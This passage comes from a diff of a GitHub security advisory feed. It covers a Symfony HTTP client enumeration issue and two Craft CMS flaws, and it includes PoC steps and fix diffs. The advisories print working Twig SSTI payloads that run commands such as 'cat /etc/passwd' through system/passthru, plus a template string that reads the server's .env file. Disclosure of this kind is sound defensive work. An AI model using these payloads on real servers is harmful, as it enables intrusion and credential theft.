-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm">https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b">https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml</a></li>
-<li><a href="https://symfony.com/cve-2024-50342">https://symfony.com/cve-2024-50342</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-50342">https://nvd.nist.gov/vuln/detail/CVE-2024-50342</a></li>
-<li><a href="https://github.com/advisories/GHSA-9c3x-r3wp-mgxm">https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-11-06T15:16:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[symfony/http-client] Symfony allows internal address and port enumeration by NoPrivateNetworkHttpClient]]></title>
-        <id>https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</id>
-        <link href="https://github.com/advisories/GHSA-9c3x-r3wp-mgxm"/>
-        <updated>2024-11-13T18:51:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>When using the <code>NoPrivateNetworkHttpClient</code>, some internal information is still leaking during host resolution, which leads to possible IP/port enumeration.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The <code>NoPrivateNetworkHttpClient</code> now filters blocked IPs earlier to prevent such leaks.</p>
-<p>The fisrt patch for this issue is available <a href="https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b">here</a> for branch 5.4.</p>
-<p>The second one is available <a href="https://github.com/symfony/symfony/commit/b4bf5afdbdcb2fd03da513ee03beeabeb551e5fa">here</a> for branch 5.4 also.</p>
-<h3 id="credits">Credits</h3>
-<p>We would like to thank Linus Karlsson and Chris Smith for reporting the issue and Nicolas Grekas for providing the fix.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm">https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b">https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml</a></li>
-<li><a href="https://symfony.com/cve-2024-50342">https://symfony.com/cve-2024-50342</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-50342">https://nvd.nist.gov/vuln/detail/CVE-2024-50342</a></li>
-<li><a href="https://github.com/advisories/GHSA-9c3x-r3wp-mgxm">https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-11-06T15:16:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[craftcms/cms] Craft CMS vulnerable to Potential Remote Code Execution via missing path normalization & Twig SSTI]]></title>
-        <id>https://github.com/advisories/GHSA-f3cw-hg6r-chfv</id>
-        <link href="https://github.com/advisories/GHSA-f3cw-hg6r-chfv"/>
-        <updated>2024-11-13T18:58:28.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Missing <code>normalizePath</code> in the function <code>FileHelper::absolutePath</code> could lead to Remote Code Execution on the server via twig SSTI.</p>
-<p><code>(Post-authentication, ALLOW_ADMIN_CHANGES=true)</code></p>
-<h3 id="details">Details</h3>
-<p>Note: This is a sequel to <a href="https://github.com/craftcms/cms/security/advisories/GHSA-44wr-rmwq-3phw">CVE-2023-40035</a></p>
-<p>In <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/helpers/FileHelper.php#L106-L137"><code>src/helpers/FileHelper.php#L106-L137</code></a>, the function <code>absolutePath</code> returned <code>$from . $ds . $to</code> without path normalization:</p>
-<pre><code class="language-php">/**
- * Returns an absolute path based on a source location or the current working directory.
- *
- * @param string $to The target path.
- * @param string|null $from The source location. Defaults to the current working directory.
- * @param string $ds the directory separator to be used in the normalized result. Defaults to `DIRECTORY_SEPARATOR`.
- * @return string
- * @since 4.3.5
- */
-public static function absolutePath(
-    string $to,
-    ?string $from = null,
-    string $ds = DIRECTORY_SEPARATOR,
-): string {
-    $to = static::normalizePath($to, $ds);
-
-    // Already absolute?
-    if (
-        str_starts_with($to, $ds) ||
-        preg_match(sprintf('/^[A-Z]:%s/', preg_quote($ds, '/')), $to)
-    ) {
-        return $to;
-    }
-
-    if ($from === null) {
-        $from = FileHelper::normalizePath(getcwd(), $ds);
-    } else {
-        $from = static::absolutePath($from, ds: $ds);
-    }
-
-    return $from . $ds . $to;
-}
-</code></pre>
-<p>This could leads to multiple security risks, one of them is in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/services/Security.php#L201-L220"><code>src/services/Security.php#L201-L220</code></a> where <code>../templates/poc</code> is not considered a system dir.</p>
-<p>Let's see what happens after calling <code>isSystemDir("../templates/poc")</code>:</p>
-<pre><code class="language-php">/**
- * Returns whether the given file path is located within or above any system directories.
- *
- * @param string $path
- * @return bool
- * @since 5.4.2
- */
-public function isSystemDir(string $path): bool // $path = "../templates/poc"
-{
-    $path = FileHelper::absolutePath($path, '/'); // $path = "/var/www/html/web//../templates/poc"
-
-    foreach (Craft::$app-&gt;getPath()-&gt;getSystemPaths() as $dir) {
-        $dir = FileHelper::absolutePath($dir, '/'); // $dir = "/var/www/html/templates"
-        if (str_starts_with("$path/", "$dir/") || str_starts_with("$dir/", "$path/")) { // if (false || false)
-            return true;
-        }
-    }
-
-    return false; // We're here!
-}
-</code></pre>
-<p>Now that the path <code>../templates/poc</code> can bypass <code>isSystemDir</code>, it will also bypass the function <code>validatePath</code> in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/fs/Local.php#L124-L136"><code>src/fs/Local.php#L124-L136</code></a>:</p>
-<pre><code class="language-php">/**
- * @param string $attribute
- * @param array|null $params
- * @param InlineValidator $validator
- * @return void
- * @since 4.4.6
- */
-public function validatePath(string $attribute, ?array $params, InlineValidator $validator): void
-{
-    if (Craft::$app-&gt;getSecurity()-&gt;isSystemDir($this-&gt;getRootPath())) {
-        $validator-&gt;addError($this, $attribute, Craft::t('app', 'Local filesystems cannot be located within or above system directories.'));
-    }
-}
-</code></pre>
-<p>We can now create a Local filesystem within the system directories, particularly in <code>/var/www/html/templates/poc</code></p>
-<p>Then create a new asset volume with that filesystem, upload a <code>poc.ttml</code> file with twig code and execute using a new route with template path <code>poc/poc.ttml</code></p>
-<p>Although craftcms does sandbox twig ssti, the list in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/web/twig/Extension.php#L180-L268">src/web/twig/Extension.php#L180-L268</a> is still incomplete.</p>
-<pre><code class="language-js">{{['id'] has some 'system'}}
-{{['ls'] has every 'passthru'}}
-{{['cat /etc/passwd']|find('system')}}
-{{['id;pwd;ls -altr /']|find('passthru')}}
-</code></pre>
-<p>These payloads still work, see <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L196-L247">twigphp/Twig/src/Extension/CoreExtension.php#getFilters()</a> and <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L291-L333">twigphp/Twig/src/Extension/CoreExtension.php#getOperators()</a> for more informations.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Craft CMS was installed using <a href="https://craftcms.com/docs/4.x/installation.html#quick-start">https://craftcms.com/docs/4.x/installation.html#quick-start</a></li>
-</ol>
-<pre><code class="language-sh">mkdir craftcms &amp;&amp; cd craftcms
-ddev config --project-type=craftcms --docroot=web --create-docroot
-ddev composer create -y --no-scripts "craftcms/craft"
-ddev craft install
-php craft setup/security-key
-ddev start
-</code></pre>
-<img src="https://github.com/user-attachments/assets/f8bcc22a-6ffd-40a5-81c6-c077fa4ce1d3" alt="start" width="1280">
-
-<ol start="2">
-<li>Create a new filesystem with base path <code>../templates/poc</code></li>
-</ol>
-<img src="https://github.com/user-attachments/assets/fe78e023-bd51-4fc1-a22e-dcfa5baf266b" alt="filesystem" width="1280">
-
-<p>Notice that the <code>poc</code> directory was created</p>
-<img src="https://github.com/user-attachments/assets/ccc45ce8-8555-4aae-ae48-320a630e7d79" alt="dir" width="167">
-
-<ol start="3">
-<li>Create a new asset volume using the <code>poc</code> filesystem</li>
-</ol>
-<img src="https://github.com/user-attachments/assets/b5530766-11b4-4e45-ae58-82f81fc2db00" alt="asset" width="1280">
-
-<p>Upload a <code>poc.ttml</code> file with RCE template code</p>
-<pre><code class="language-js">{{'&lt;pre&gt;'}}
-{{ 8*8 }}
-{{['id'] has some 'system'}}
-{{['ls'] has every 'passthru'}}
-{{['cat /etc/passwd']|find('system')}}
-{{['id;pwd;ls -altr /']|find('passthru')}}
-</code></pre>
-<p>Note: <code>find</code> was added to twig <a href="https://github.com/twigphp/Twig/commit/4e262511930e408e4c7eda07b1c977f2ea98575c">last month</a>. If you're running this poc on an older version of twig try removing the last 2 lines.</p>
-<img src="https://github.com/user-attachments/assets/63e65beb-2ede-4141-85d2-e7d21cd4b8ad" alt="upload" width="1280">
-
-<p><img alt="ttml" src="https://github.com/user-attachments/assets/9db8ca9b-25eb-4014-a7f5-4ece895b106d"></p>
-<ol start="4">
-<li>Create a new route <code>*</code> with template <code>poc/poc.ttml</code></li>
-</ol>
-<img src="https://github.com/user-attachments/assets/b92d9340-b6a5-40d8-a8e8-ddab5cfc9f21" alt="route" width="1280">
-
-<ol start="5">
-<li>This leads to Remote Code Execution on arbitrary route <code>/*</code></li>
-</ol>
-<img src="https://github.com/user-attachments/assets/19765f6c-1c28-4a0b-a89c-25f6f05ceca6" alt="rce" width="454">
-
-<h3 id="remediation">Remediation</h3>
-<pre><code class="language-diff">diff --git a/src/helpers/FileHelper.php b/src/helpers/FileHelper.php
-index 0c2da884a7..ac23ce556a 100644
---- a/src/helpers/FileHelper.php
-+++ b/src/helpers/FileHelper.php
-@@ -133,7 +133,7 @@ class FileHelper extends \yii\helpers\FileHelper
-             $from = static::absolutePath($from, ds: $ds);
-         }
-
--        return $from . $ds . $to;
-+        return FileHelper::normalizePath($from . $ds . $to);
-     }
-
-     /**
-</code></pre>
-<p><img alt="fix_norm" src="https://github.com/user-attachments/assets/4c8e5b4f-6216-416c-87a1-9b9fae033971"></p>
-<p>See <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php">twigphp/Twig/src/Extension/CoreExtension.php</a> for updated filters and operators, a possible fix could look like:</p>
-<pre><code class="language-diff">diff --git a/src/web/twig/Extension.php b/src/web/twig/Extension.php
-index efff2d2412..756f452f8b 100644
---- a/src/web/twig/Extension.php
-+++ b/src/web/twig/Extension.php
-@@ -225,6 +225,9 @@ class Extension extends AbstractExtension implements GlobalsInterface
-             new TwigFilter('lcfirst', [$this, 'lcfirstFilter']),
-             new TwigFilter('literal', [$this, 'literalFilter']),
-             new TwigFilter('map', [$this, 'mapFilter'], ['needs_environment' =&gt; true]),
-+            new TwigFilter('find', [$this, 'find'], ['needs_environment' =&gt; true]),
-+            new TwigFilter('has some' =&gt; ['precedence' =&gt; 20, 'class' =&gt; HasSomeBinary::class, 'associativity' =&gt; ExpressionParser::OPERATOR_LEFT]),
-+            new TwigFilter('has every' =&gt; ['precedence' =&gt; 20, 'class' =&gt; HasEveryBinary::class, 'associativity' =&gt; ExpressionParser::OPERATOR_LEFT]),
-             new TwigFilter('markdown', [$this, 'markdownFilter'], ['is_safe' =&gt; ['html']]),
-             new TwigFilter('md', [$this, 'markdownFilter'], ['is_safe' =&gt; ['html']]),
-             new TwigFilter('merge', [$this, 'mergeFilter']),
-</code></pre>
-<p><img alt="fix_ssti" src="https://github.com/user-attachments/assets/5d9ce9be-022b-4853-a5f9-688b247cc27c"></p>
-<h3 id="impact">Impact</h3>
-<p>Take control of vulnerable systems, Data exfiltrations, Malware execution, Pivoting, etc.</p>
-<p>Although the vulnerability is exploitable only in the authenticated users, configuration with <code>ALLOW_ADMIN_CHANGES=true</code>, there is still a potential security threat (Remote Code Execution)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv">https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52293">https://nvd.nist.gov/vuln/detail/CVE-2024-52293</a></li>
-<li><a href="https://github.com/craftcms/cms/commit/123e48a696de1e2f63ab519d4730eb3b87beaa58">https://github.com/craftcms/cms/commit/123e48a696de1e2f63ab519d4730eb3b87beaa58</a></li>
-<li><a href="https://github.com/advisories/GHSA-f3cw-hg6r-chfv">https://github.com/advisories/GHSA-f3cw-hg6r-chfv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f3cw-hg6r-chfv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-13T14:16:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[craftcms/cms] Craft CMS vulnerable to Potential Remote Code Execution via missing path normalization & Twig SSTI]]></title>
-        <id>https://github.com/advisories/GHSA-f3cw-hg6r-chfv</id>
-        <link href="https://github.com/advisories/GHSA-f3cw-hg6r-chfv"/>
-        <updated>2024-11-13T18:58:28.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Missing <code>normalizePath</code> in the function <code>FileHelper::absolutePath</code> could lead to Remote Code Execution on the server via twig SSTI.</p>
-<p><code>(Post-authentication, ALLOW_ADMIN_CHANGES=true)</code></p>
-<h3 id="details">Details</h3>
-<p>Note: This is a sequel to <a href="https://github.com/craftcms/cms/security/advisories/GHSA-44wr-rmwq-3phw">CVE-2023-40035</a></p>
-<p>In <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/helpers/FileHelper.php#L106-L137"><code>src/helpers/FileHelper.php#L106-L137</code></a>, the function <code>absolutePath</code> returned <code>$from . $ds . $to</code> without path normalization:</p>
-<pre><code class="language-php">/**
- * Returns an absolute path based on a source location or the current working directory.
- *
- * @param string $to The target path.
- * @param string|null $from The source location. Defaults to the current working directory.
- * @param string $ds the directory separator to be used in the normalized result. Defaults to `DIRECTORY_SEPARATOR`.
- * @return string
- * @since 4.3.5
- */
-public static function absolutePath(
-    string $to,
-    ?string $from = null,
-    string $ds = DIRECTORY_SEPARATOR,
-): string {
-    $to = static::normalizePath($to, $ds);
-
-    // Already absolute?
-    if (
-        str_starts_with($to, $ds) ||
-        preg_match(sprintf('/^[A-Z]:%s/', preg_quote($ds, '/')), $to)
-    ) {
-        return $to;
-    }
-
-    if ($from === null) {
-        $from = FileHelper::normalizePath(getcwd(), $ds);
-    } else {
-        $from = static::absolutePath($from, ds: $ds);
-    }
-
-    return $from . $ds . $to;
-}
-</code></pre>
-<p>This could leads to multiple security risks, one of them is in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/services/Security.php#L201-L220"><code>src/services/Security.php#L201-L220</code></a> where <code>../templates/poc</code> is not considered a system dir.</p>
-<p>Let's see what happens after calling <code>isSystemDir("../templates/poc")</code>:</p>
-<pre><code class="language-php">/**
- * Returns whether the given file path is located within or above any system directories.
- *
- * @param string $path
- * @return bool
- * @since 5.4.2
- */
-public function isSystemDir(string $path): bool // $path = "../templates/poc"
-{
-    $path = FileHelper::absolutePath($path, '/'); // $path = "/var/www/html/web//../templates/poc"
-
-    foreach (Craft::$app-&gt;getPath()-&gt;getSystemPaths() as $dir) {
-        $dir = FileHelper::absolutePath($dir, '/'); // $dir = "/var/www/html/templates"
-        if (str_starts_with("$path/", "$dir/") || str_starts_with("$dir/", "$path/")) { // if (false || false)
-            return true;
-        }
-    }
-
-    return false; // We're here!
-}
-</code></pre>
-<p>Now that the path <code>../templates/poc</code> can bypass <code>isSystemDir</code>, it will also bypass the function <code>validatePath</code> in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/fs/Local.php#L124-L136"><code>src/fs/Local.php#L124-L136</code></a>:</p>
-<pre><code class="language-php">/**
- * @param string $attribute
- * @param array|null $params
- * @param InlineValidator $validator
- * @return void
- * @since 4.4.6
- */
-public function validatePath(string $attribute, ?array $params, InlineValidator $validator): void
-{
-    if (Craft::$app-&gt;getSecurity()-&gt;isSystemDir($this-&gt;getRootPath())) {
-        $validator-&gt;addError($this, $attribute, Craft::t('app', 'Local filesystems cannot be located within or above system directories.'));
-    }
-}
-</code></pre>
-<p>We can now create a Local filesystem within the system directories, particularly in <code>/var/www/html/templates/poc</code></p>
-<p>Then create a new asset volume with that filesystem, upload a <code>poc.ttml</code> file with twig code and execute using a new route with template path <code>poc/poc.ttml</code></p>
-<p>Although craftcms does sandbox twig ssti, the list in <a href="https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/web/twig/Extension.php#L180-L268">src/web/twig/Extension.php#L180-L268</a> is still incomplete.</p>
-<pre><code class="language-js">{{['id'] has some 'system'}}
-{{['ls'] has every 'passthru'}}
-{{['cat /etc/passwd']|find('system')}}
-{{['id;pwd;ls -altr /']|find('passthru')}}
-</code></pre>
-<p>These payloads still work, see <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L196-L247">twigphp/Twig/src/Extension/CoreExtension.php#getFilters()</a> and <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L291-L333">twigphp/Twig/src/Extension/CoreExtension.php#getOperators()</a> for more informations.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Craft CMS was installed using <a href="https://craftcms.com/docs/4.x/installation.html#quick-start">https://craftcms.com/docs/4.x/installation.html#quick-start</a></li>
-</ol>
-<pre><code class="language-sh">mkdir craftcms &amp;&amp; cd craftcms
-ddev config --project-type=craftcms --docroot=web --create-docroot
-ddev composer create -y --no-scripts "craftcms/craft"
-ddev craft install
-php craft setup/security-key
-ddev start
-</code></pre>
-<img src="https://github.com/user-attachments/assets/f8bcc22a-6ffd-40a5-81c6-c077fa4ce1d3" alt="start" width="1280">
-
-<ol start="2">
-<li>Create a new filesystem with base path <code>../templates/poc</code></li>
-</ol>
-<img src="https://github.com/user-attachments/assets/fe78e023-bd51-4fc1-a22e-dcfa5baf266b" alt="filesystem" width="1280">
-
-<p>Notice that the <code>poc</code> directory was created</p>
-<img src="https://github.com/user-attachments/assets/ccc45ce8-8555-4aae-ae48-320a630e7d79" alt="dir" width="167">
-
-<ol start="3">
-<li>Create a new asset volume using the <code>poc</code> filesystem</li>
-</ol>
-<img src="https://github.com/user-attachments/assets/b5530766-11b4-4e45-ae58-82f81fc2db00" alt="asset" width="1280">
-
-<p>Upload a <code>poc.ttml</code> file with RCE template code</p>
-<pre><code class="language-js">{{'&lt;pre&gt;'}}
-{{ 8*8 }}
-{{['id'] has some 'system'}}
-{{['ls'] has every 'passthru'}}
-{{['cat /etc/passwd']|find('system')}}
-{{['id;pwd;ls -altr /']|find('passthru')}}
-</code></pre>
-<p>Note: <code>find</code> was added to twig <a href="https://github.com/twigphp/Twig/commit/4e262511930e408e4c7eda07b1c977f2ea98575c">last month</a>. If you're running this poc on an older version of twig try removing the last 2 lines.</p>
-<img src="https://github.com/user-attachments/assets/63e65beb-2ede-4141-85d2-e7d21cd4b8ad" alt="upload" width="1280">
-
-<p><img alt="ttml" src="https://github.com/user-attachments/assets/9db8ca9b-25eb-4014-a7f5-4ece895b106d"></p>
-<ol start="4">
-<li>Create a new route <code>*</code> with template <code>poc/poc.ttml</code></li>
-</ol>
-<img src="https://github.com/user-attachments/assets/b92d9340-b6a5-40d8-a8e8-ddab5cfc9f21" alt="route" width="1280">
-
-<ol start="5">
-<li>This leads to Remote Code Execution on arbitrary route <code>/*</code></li>
-</ol>
-<img src="https://github.com/user-attachments/assets/19765f6c-1c28-4a0b-a89c-25f6f05ceca6" alt="rce" width="454">
-
-<h3 id="remediation">Remediation</h3>
-<pre><code class="language-diff">diff --git a/src/helpers/FileHelper.php b/src/helpers/FileHelper.php
-index 0c2da884a7..ac23ce556a 100644
---- a/src/helpers/FileHelper.php
-+++ b/src/helpers/FileHelper.php
-@@ -133,7 +133,7 @@ class FileHelper extends \yii\helpers\FileHelper
-             $from = static::absolutePath($from, ds: $ds);
-         }
-
--        return $from . $ds . $to;
-+        return FileHelper::normalizePath($from . $ds . $to);
-     }
-
-     /**
-</code></pre>
-<p><img alt="fix_norm" src="https://github.com/user-attachments/assets/4c8e5b4f-6216-416c-87a1-9b9fae033971"></p>
-<p>See <a href="https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php">twigphp/Twig/src/Extension/CoreExtension.php</a> for updated filters and operators, a possible fix could look like:</p>
-<pre><code class="language-diff">diff --git a/src/web/twig/Extension.php b/src/web/twig/Extension.php
-index efff2d2412..756f452f8b 100644
---- a/src/web/twig/Extension.php
-+++ b/src/web/twig/Extension.php
-@@ -225,6 +225,9 @@ class Extension extends AbstractExtension implements GlobalsInterface
-             new TwigFilter('lcfirst', [$this, 'lcfirstFilter']),
-             new TwigFilter('literal', [$this, 'literalFilter']),
-             new TwigFilter('map', [$this, 'mapFilter'], ['needs_environment' =&gt; true]),
-+            new TwigFilter('find', [$this, 'find'], ['needs_environment' =&gt; true]),
-+            new TwigFilter('has some' =&gt; ['precedence' =&gt; 20, 'class' =&gt; HasSomeBinary::class, 'associativity' =&gt; ExpressionParser::OPERATOR_LEFT]),
-+            new TwigFilter('has every' =&gt; ['precedence' =&gt; 20, 'class' =&gt; HasEveryBinary::class, 'associativity' =&gt; ExpressionParser::OPERATOR_LEFT]),
-             new TwigFilter('markdown', [$this, 'markdownFilter'], ['is_safe' =&gt; ['html']]),
-             new TwigFilter('md', [$this, 'markdownFilter'], ['is_safe' =&gt; ['html']]),
-             new TwigFilter('merge', [$this, 'mergeFilter']),
-</code></pre>
-<p><img alt="fix_ssti" src="https://github.com/user-attachments/assets/5d9ce9be-022b-4853-a5f9-688b247cc27c"></p>
-<h3 id="impact">Impact</h3>
-<p>Take control of vulnerable systems, Data exfiltrations, Malware execution, Pivoting, etc.</p>
-<p>Although the vulnerability is exploitable only in the authenticated users, configuration with <code>ALLOW_ADMIN_CHANGES=true</code>, there is still a potential security threat (Remote Code Execution)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv">https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52293">https://nvd.nist.gov/vuln/detail/CVE-2024-52293</a></li>
-<li><a href="https://github.com/craftcms/cms/commit/123e48a696de1e2f63ab519d4730eb3b87beaa58">https://github.com/craftcms/cms/commit/123e48a696de1e2f63ab519d4730eb3b87beaa58</a></li>
-<li><a href="https://github.com/advisories/GHSA-f3cw-hg6r-chfv">https://github.com/advisories/GHSA-f3cw-hg6r-chfv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f3cw-hg6r-chfv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-13T14:16:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[craftcms/cms] Craft CMS Arbitrary System File Read]]></title>
-        <id>https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</id>
-        <link href="https://github.com/advisories/GHSA-cw6g-qmjq-6w2w"/>
-        <updated>2024-11-13T18:58:36.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>By abusing the mail notification template it is possible to read arbitrary operating system files. </p>
-<h3 id="details">Details</h3>
-<p>The <a href="https://craftcms.com/docs/3.x/dev/functions.html#dataurl">dataUrl</a> function can be exploited if an attacker has write permissions on system notification templates. This function accepts an absolute file path, reads the file's content, and converts it into a Base64-encoded string. By embedding this function within a system notification template, the attacker can exfiltrate the Base64-encoded file content through a triggered system email notification. Once the email is received, the Base64 payload can be decoded, allowing the attacker to read arbitrary files on the server.</p>
-<p>Requirements:</p>
-<ul>
-<li>write permissions to system notification templates</li>
-<li>ability to trigger a corresponding system email</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Modify a template to contain the following twig template string:</li>
-</ol>
-<pre><code class="language-twig">{{ dataUrl('/var/www/web/.env') }}
-</code></pre>
-<ol start="2">
-<li>Trigger the corresponding notification email (e.g. by resetting a password)</li>
-<li>Receive the email and decode the base64 string</li>
-</ol>
-<p>Mail received:
-<img alt="Bildschirmfoto 2024-09-05 um 16 20 41" src="https://github.com/user-attachments/assets/24dc5196-6847-4006-b7ef-8cd10d659c30"></p>
-<p>Decoded string:
-<img alt="Bildschirmfoto 2024-09-05 um 16 28 24" src="https://github.com/user-attachments/assets/1913a475-5277-49b9-9210-2f3fcd3b9bf1"></p>
-<h3 id="impact">Impact</h3>
-<ol>
-<li><p>Exposure of Sensitive Information: Arbitrary file read can lead to the exposure of sensitive data such as configuration files (e.g., /etc/passwd, .env, config.php), which may contain credentials, API keys, or database passwords. This can provide the attacker with further access to the system or connected services.</p>
-</li>
-<li><p>Privilege Escalation: If the attacker is able to read files that contain privileged information, such as credentials for other systems or applications, they may be able to escalate their privileges beyond what the web admin role originally allowed, potentially gaining full control over the server or other related systems.</p>
-</li>
-<li><p>Server Compromise: Access to files like SSH keys, private certificates, or system configuration files can lead to the complete compromise of the underlying server. With this information, an attacker could remotely log in to the server or impersonate it in secure communications.</p>
-</li>
-<li><p>Exfiltration of User Data: The ability to read arbitrary files may allow an attacker to access user data, such as stored passwords, session tokens, or private information (like uploaded files or logs), leading to a breach of confidentiality and violating privacy regulations (e.g., GDPR).</p>
-</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-cw6g-qmjq-6w2w">https://github.com/craftcms/cms/security/advisories/GHSA-cw6g-qmjq-6w2w</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52292">https://nvd.nist.gov/vuln/detail/CVE-2024-52292</a></li>
-<li><a href="https://github.com/advisories/GHSA-cw6g-qmjq-6w2w">https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-13T14:15:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[craftcms/cms] Craft CMS Arbitrary System File Read]]></title>
-        <id>https://github.com/advisories/GHSA-cw6g-qmjq-6w2w</id>
-        <link href="https://github.com/advisories/GHSA-cw6g-qmjq-6w2w"/>
-        <updated>2024-11-13T18:58:36.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>By abusing the mail notification template it is possible to read arbitrary operating system files. </p>
-<h3 id="details">Details</h3>
-<p>The <a href="https://craftcms.com/docs/3.x/dev/functions.html#dataurl">dataUrl</a> function can be exploited if an attacker has write permissions on system notification templates. This function accepts an absolute file path, reads the file's content, and converts it into a Base64-encoded string. By embedding this function within a system notification template, the attacker can exfiltrate the Base64-encoded file content through a triggered system email notification. Once the email is received, the Base64 payload can be decoded, allowing the attacker to read arbitrary files on the server.</p>
-<p>Requirements:</p>
-<ul>
-<li>write permissions to system notification templates</li>
-<li>ability to trigger a corresponding system email</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Modify a template to contain the following twig template string:</li>
-</ol>
